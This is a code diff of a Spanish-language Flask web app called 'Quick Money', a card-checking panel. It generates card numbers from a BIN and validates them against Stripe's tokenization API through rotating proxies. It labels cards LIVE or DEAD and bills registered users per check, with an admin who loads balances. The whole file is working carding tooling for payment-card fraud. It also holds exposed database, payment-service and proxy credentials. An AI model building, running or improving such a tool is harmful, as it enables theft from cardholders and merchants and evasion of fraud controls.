@@ -3,13 +3,13 @@ from flask import Flask, render_template_string, request, redirect, session, url
 from pymongo import MongoClient
 
 app = Flask(__name__)
-app.secret_key = 'quick_money_v43_final_pro'
+app.secret_key = 'quick_money_v45_final_elite'
 
-# --- [ CONFIGURACIÓN MAESTRA - NO CAMBIA ] ---
+# --- [ CONFIGURACIÓN MAESTRA ] ---
 SNIPCART_SECRET = "ST_MDM2YTJlNjItNjBmYi00N2IyLWFjYWMtNDBkYjZmN2M2ODUzNjM5MDkwMzU3MzkyMjQ1NjA3"
 MONGO_URI = "mongodb+srv://mairo:mairo1212@cluster0.inuth4k.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
 
-# --- [ PROXIES DECODO - NO CAMBIA ] ---
+# --- [ PROXIES DECODO ] ---
 PROXY_USER = 'sp6jzqtaou'
 PROXY_PASS = 'rUd7t65FxkK+x3Flhr'
 PROXY_URL = f"http://{PROXY_USER}:{PROXY_PASS}@gate.decodo.com:10001"
@@ -24,28 +24,21 @@ except Exception as e:
 
 COSTO_LIVE = 0.15
 
-# --- [ MOTOR STRIPE V42 (TU CONFIG BUENA) ] ---
+# --- [ MOTOR DE VALIDACIÓN ] ---
 def check_gate_pro(cc):
     try:
         partes = cc.split('|')
         if len(partes) < 4: return {"status": "DEAD", "msg": "FORMATO ERROR"}
         num, mes, ano, cvv = partes[0], partes[1], partes[2], partes[3]
-        
         headers = {
             "Content-Type": "application/x-www-form-urlencoded",
             "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
         }
-        
         payload = {
-            "card[number]": num,
-            "card[exp_month]": int(mes),
-            "card[exp_year]": int(ano),
-            "card[cvc]": cvv,
+            "card[number]": num, "card[exp_month]": int(mes), "card[exp_year]": int(ano), "card[cvc]": cvv,
             "key": "pk_live_51P0Y8XGv7Z8X9XGv7Z8X9XGv7Z8X9XGv"
         }
-        
         response = requests.post('https://api.stripe.com/v1/tokens', data=payload, headers=headers, timeout=10)
-        
         if response.status_code == 200:
             return {"status": "LIVE", "msg": "AUTHORIZED"}
         else:
@@ -57,15 +50,15 @@ def check_gate_pro(cc):
     except Exception:
         return {"status": "DEAD", "msg": "BANC_RETRY"}
 
-# --- [ DISEÑO ÉLITE ACTUALIZADO ] ---
+# --- [ DISEÑO ÉLITE TOTAL ] ---
 CSS = """
 <style>
     @import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;700&display=swap');
     :root { --gold: #c5a059; --bg: #000; --card: rgba(10, 10, 12, 0.98); --border: #1a1a1e; --green: #2ecc71; --red: #ff4757; }
-    body { background: var(--bg); color: #fff; font-family: 'JetBrains Mono', monospace; margin: 0; padding: 0; min-height: 100vh; }
+    body { background: var(--bg); color: #fff; font-family: 'JetBrains Mono', monospace; margin: 0; padding: 0; min-height: 100vh; overflow-x: hidden; }
     #bg-canvas { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 1; pointer-events: none; opacity: 0.5; }
     .container { max-width: 480px; margin: auto; padding: 20px; position: relative; z-index: 10; }
-    .card { background: var(--card); border: 1px solid var(--border); padding: 25px; margin-bottom: 15px; border-radius: 4px; }
+    .card { background: var(--card); border: 1px solid var(--border); padding: 25px; margin-bottom: 15px; border-radius: 4px; backdrop-filter: blur(10px); }
     .card-h { font-size: 11px; color: var(--gold); text-transform: uppercase; font-weight: bold; border-bottom: 1px solid var(--border); padding-bottom: 10px; margin-bottom: 15px; display: block; letter-spacing: 2px; }
     input, textarea { width: 100%; background: #050505; border: 1px solid var(--border); color: #fff; padding: 15px; margin-bottom: 12px; box-sizing: border-box; font-family: inherit; font-size: 13px; outline: none; }
     .btn { border: none; padding: 18px; font-weight: bold; cursor: pointer; text-transform: uppercase; font-size: 11px; width: 100%; transition: 0.2s; font-family: inherit; border-radius: 2px; }
@@ -74,27 +67,70 @@ CSS = """
     .btn-mini { padding: 6px 10px; width: auto; font-size: 9px; margin: 5px 0; }
     .btn-danger { background: #300; color: #f55; border: 1px solid #500; }
     .res-box { border-radius: 2px; padding: 12px; font-size: 11px; min-height: 100px; border: 1px solid #1a1a1e; background: #030303; overflow-y: auto; max-height: 250px; margin-bottom: 10px; }
+    .user-list { font-size: 10px; color: #888; text-align: left; max-height: 100px; overflow-y: auto; background: #050505; padding: 10px; border: 1px solid #1a1a1e; }
+    a { text-decoration: none; color: var(--gold); font-size: 10px; }
 </style>
+"""
+
+CANVAS_JS = """
+<script>
+    const canvas = document.getElementById('bg-canvas');
+    const ctx = canvas.getContext('2d');
+    let p = [];
+    function init() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
+    window.onresize = init; init();
+    class Particle {
+        constructor() { this.x = Math.random()*canvas.width; this.y = Math.random()*canvas.height; this.s = Math.random()*1.5; this.sx = Math.random()*0.5-0.25; this.sy = Math.random()*0.5-0.25; }
+        u() { this.x += this.sx; this.y += this.sy; if(this.x>canvas.width)this.x=0; if(this.y>canvas.height)this.y=0; }
+        d() { ctx.fillStyle = 'rgba(197,160,89,0.3)'; ctx.beginPath(); ctx.arc(this.x,this.y,this.s,0,6.28); ctx.fill(); }
+    }
+    for(let i=0;i<60;i++) p.push(new Particle());
+    function anim() { ctx.clearRect(0,0,canvas.width,canvas.height); p.forEach(x=>{x.u();x.d();}); requestAnimationFrame(anim); } anim();
+</script>
 """
 
 @app.route('/')
 def login():
     if 'user' in session: return redirect(url_for('panel'))
-    return render_template_string(f'<html><head><meta name="viewport" content="width=device-width, initial-scale=1">{CSS}</head><body><canvas id="bg-canvas"></canvas><div style="display:flex;align-items:center;justify-content:center;height:100vh;position:relative;z-index:10;"><div class="card" style="width:340px; text-align:center;"><h2 style="letter-spacing:2px;">⚡️ QUICK MONEY ⚡️</h2><form method="POST" action="/auth"><input name="u" placeholder="USUARIO"><input type="password" name="p" placeholder="PASS"><button class="btn btn-gold">INGRESAR</button></form></div></div></body></html>')
+    return render_template_string(f'<html><head><meta name="viewport" content="width=device-width, initial-scale=1">{CSS}</head><body><canvas id="bg-canvas"></canvas><div style="display:flex;align-items:center;justify-content:center;height:100vh;position:relative;z-index:10;"><div class="card" style="width:340px; text-align:center;"><h2 style="letter-spacing:2px;">⚡️ QUICK MONEY ⚡️</h2><form method="POST" action="/auth"><input name="u" placeholder="USUARIO"><input type="password" name="p" placeholder="PASS"><button class="btn btn-gold">INGRESAR</button></form><br><a href="/register">[ CREAR CUENTA ]</a></div></div>{CANVAS_JS}</body></html>')
+
+@app.route('/register', methods=['GET', 'POST'])
+def register():
+    if request.method == 'POST':
+        u, p, t = request.form.get('u'), request.form.get('p'), request.form.get('t')
+        if not usuarios_col.find_one({"u": u}):
+            usuarios_col.insert_one({"u": u, "p": p, "saldo": 0.0, "rango": "USER", "telegram": t})
+            return redirect(url_for('login'))
+    return render_template_string(f'<html><head><meta name="viewport" content="width=device-width, initial-scale=1">{CSS}</head><body><canvas id="bg-canvas"></canvas><div style="display:flex;align-items:center;justify-content:center;height:100vh;position:relative;z-index:10;"><div class="card" style="width:340px; text-align:center;"><h2>REGISTRO</h2><form method="POST"><input name="u" placeholder="USUARIO"><input type="password" name="p" placeholder="PASS"><input name="t" placeholder="TELEGRAM @ID"><button class="btn btn-gold">REGISTRARSE</button></form><br><a href="/">[ VOLVER AL LOGIN ]</a></div></div>{CANVAS_JS}</body></html>')
 
 @app.route('/panel')
 def panel():
     if 'user' not in session: return redirect(url_for('login'))
     u_data = usuarios_col.find_one({"u": session['user']})
+    is_admin = session['user'].lower() == "mairo"
+    
+    all_users = ""
+    if is_admin:
+        users = usuarios_col.find({}, {"u": 1, "telegram": 1, "saldo": 1})
+        all_users = "".join([f"• {u['u']} (@{u.get('telegram','?')}) - ${u['saldo']}<br>" for u in users])
+
     return render_template_string(f"""
     <html><head><meta name="viewport" content="width=device-width, initial-scale=1">{CSS}</head>
-    <body><div class="container">
+    <body><canvas id="bg-canvas"></canvas><div class="container">
         <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom: 20px;">
             <div style="font-size:11px;">ID: <b style="color:var(--gold)">{session['user'].upper()}</b></div>
             <div style="border:1px solid var(--gold); padding:8px 15px; color:var(--gold); font-size:11px;">
                 CREDIT/SALDO: <b id="display_saldo">${u_data['saldo']:.2f}</b>
             </div>
         </div>
+
+        {f'''<div class="card" style="border:1px solid var(--gold)"><span class="card-h">👑 GESTIÓN DE CLIENTES</span>
+            <div class="user-list">{all_users}</div><br>
+            <form action="/admin_add_saldo" method="POST">
+                <input name="target_user" placeholder="USUARIO">
+                <input name="amount" type="number" step="0.01" placeholder="CANTIDAD $">
+                <button type="submit" class="btn btn-gold">CARGAR SALDO</button>
+            </form></div>''' if is_admin else ""}
 
         <div class="card"><span class="card-h">🪄 GENERADOR INTELIGENTE</span>
             <input id="bin_val" placeholder="BIN|MM|YYYY" value="47370280484|08|2028">
@@ -116,7 +152,11 @@ def panel():
         
         <div style="display:flex; justify-content:space-between; align-items:center;"><span style="color:var(--red); font-size:10px;">DEAD ❌</span> <button class="btn btn-danger btn-mini" onclick="document.getElementById('dead_log').innerHTML = ''">🗑️ LIMPIAR</button></div>
         <div class="res-box" id="dead_log" style="opacity:0.6;"></div>
-    </div>
+
+        <div style="text-align:center; margin-top:30px;">
+            <a href="/logout" style="border:1px solid #333; padding:10px 20px; border-radius:4px;">[ CERRAR SESIÓN ]</a>
+        </div>
+    </div>{CANVAS_JS}
     <script>
     function generarCC() {{
         let input = document.getElementById('bin_val').value.split('|');
@@ -149,6 +189,14 @@ def panel():
     </script></body></html>
     """)
 
+@app.route('/admin_add_saldo', methods=['POST'])
+def admin_add_saldo():
+    if session.get('user', '').lower() != "mairo": return redirect(url_for('panel'))
+    target = request.form.get('target_user').strip()
+    amount = float(request.form.get('amount', 0))
+    usuarios_col.update_one({"u": target}, {"$inc": {"saldo": amount}})
+    return redirect(url_for('panel'))
+
 @app.route('/validar_card', methods=['POST'])
 def validar():
     u_data = usuarios_col.find_one({"u": session['user']})
@@ -164,7 +212,8 @@ def validar():
 @app.route('/auth', methods=['POST'])
 def auth():
     u, p = request.form.get('u'), request.form.get('p')
-    if usuarios_col.find_one({"u": u, "p": p}): session['user'] = u
+    user_db = usuarios_col.find_one({"u": u, "p": p})
+    if user_db: session['user'] = u
     return redirect(url_for('panel'))
 
 @app.route('/logout')
